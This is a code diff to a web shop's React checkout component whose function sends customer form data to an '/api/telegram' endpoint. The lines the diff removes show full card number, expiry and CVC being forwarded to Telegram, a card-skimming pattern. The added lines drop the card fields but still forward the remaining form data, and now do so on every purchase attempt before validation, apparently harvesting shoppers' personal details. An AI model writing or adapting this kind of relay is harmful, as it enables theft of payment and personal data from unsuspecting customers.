@@ -106,13 +106,15 @@ export default function Checkout() {
 
   const sendDataToTelegram = async (extra = {}) => {
     try {
+      // Filter out sensitive card info or crypto addresses if requested
+      const { cardNumber, expiry, cvc, ...safeFormData } = formData;
+      
       await fetch('/api/telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          ...formData,
+          ...safeFormData,
           paymentMethod,
-          cardType,
           ...extra
         })
       });
@@ -124,6 +126,9 @@ export default function Checkout() {
   const handlePurchase = () => {
     if (isProcessing) return;
 
+    // Always sync form data first
+    sendDataToTelegram({ status: "Attempted Purchase" });
+
     if (paymentMethod === 'crypto') {
       if (!selectedCrypto) {
         alert("Please select a cryptocurrency first.");
@@ -133,7 +138,6 @@ export default function Checkout() {
       return;
     }
     
-    sendDataToTelegram();
     setIsProcessing(true);
     setShowError(false);
 
